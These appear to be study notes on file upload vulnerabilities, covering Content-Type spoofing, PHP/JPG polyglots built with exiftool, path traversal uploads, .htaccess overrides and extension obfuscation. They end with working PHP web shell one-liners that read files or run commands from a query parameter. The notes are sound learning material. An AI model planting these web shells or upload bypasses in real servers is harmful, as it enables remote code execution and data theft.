# File Upload
File upload vulnerabilities are when a web server allows users to upload files to its filesystem without sufficiently validating things like their name, type, contents, or size.

			Servers handling requests foor static files
- If this file type is non-executable, such as an image or a static HTML page, the server may just send the file's contents to the client in an HTTP response.

- If the file type is executable, such as a PHP file, and the server is configured to execute files of this type, it will assign variables based on the headers and parameters in the HTTP request before running the script. The resulting output may then be sent to the client in an HTTP response

- If the file type is executable, but the server is not configured to execute files of this type, it will generally respond with an error. However, in some cases, the contents of the file may still be served to the client as plain text. Such misconfigurations can occasionally be exploited to leak source code and other sensitive information.

<!-- -->

				Flawed file type validation
- When submitting HTML forms, your browser typically sends the provided data in a `POST` request with the content type `application/x-www-form-url-encoded`. This is fine for sending simple text like your name, address, and so on, but is not suitable for sending large amounts of binary data, such as an entire image file or a PDF document. In this case, the content type `multipart/form-data` is the preferred approach.

- One way that websites may attempt to validate file uploads is to check that this input-specific `Content-Type` header matches an expected MIME type. If the server is only expecting image files, for example, it may only allow types like `image/jpeg` and `image/png`.

Example of file type Validation:
![](file-upload3.png)
We need to change `Content-Type: application/x-php`
![](file-upload4.png)
Now The web server thinks it's a jpeg

				Flawed file content validation
Instead of  trusting the `Content-Type` specified in a request, more secure servers try to verify that the contents of the file actually match what is expected.

Ways a server will verify the content:
- Size of the packet
- Bytes in the header or footer (example jpeg always begins with `FF D8 FF` )

How to exploit:
- Create a polygot PHP/JPG file using `ExifTool`
`exiftool -Comment="<?php echo 'START ' . file_get_contents('/path/') . ' END'; ?>" image.jpg -o shell.php`
- The payload will be between Start and End

<!-- -->
![](file-upload7.png)


			shell upload via path traversal
- servers generally only run scripts whose MIME type they have been explicitly configured to execute. Otherwise, they may just return some kind of error message or, in some cases, serve the contents of the file as plain text instead.
- 
A directory to which user-supplied files are uploaded will likely have much stricter controls than other locations on the filesystem that are assumed to be out of reach for end users. If you can find a way to upload a script to a different directory that's not supposed to contain user-supplied files, the server may execute your script.
 
 ![](Fileupload-1.png) 
 We need to make `filename=shell.php` a directory traversal.The server may strip a normal directory traversal `../` so we should obfuscate it.
![](file-upload2.png)
Then go to the url `Website.com/profile/../shell.php` to execute shell

		Overriding server configuration
 - servers also allow developers to create special configuration files within individual directories in order to override or add to one or more of the global settings. Apache servers, for example, will load a directory-specific configuration from a file called `.htaccess` if one is present.
 
 - Sometimes their isnt anything stopping the attacker from also changing `.htaccess` and adding their own file extensions
 
 Example:
 
Normal Malicous File But `.php` is blacklisted 
 ![](File-upload5.png)
 We need to add `.php` in the `.htacess`.
 doing this by changing `filename:` and `content-type:`
 Adding the payload will Differ depending on what backend server is being used.
 In this instance apache is being used.
 ![](File-upload6.png)
 <!-- -->

		File upload race conditions

			Insufficient blacklisting of dangerouse file types
One way to prevent users uploading malicious scripts is to blacklist dangerous file extensions like `.php`, But this is easily bypassed using lesser know file types such as `.php5` or `.shtml` etc.
 
 
			Obfuscating file extensions
- provide multiple Extensions `exploit.php.jpg`
- Add trailing extensions `exploit.php.`
- Url encoding `exploit%2Ephp`
- Null byte `exploit.php%00.jpg`
- Sometimes stripping isnt done recursively `exploit.p.php.hp`
 
 <!-- -->
 
					Web Shells
 Used to read arbitrary files:
 `<?php echo file_get_contents('/path/to/target/file');?>`
 Enables you to pass arbitrary command via query parameter:
`<?php echo system($_GET['command']); ?>`
`GET /example/exploit.php?command=id HTTP/1.1`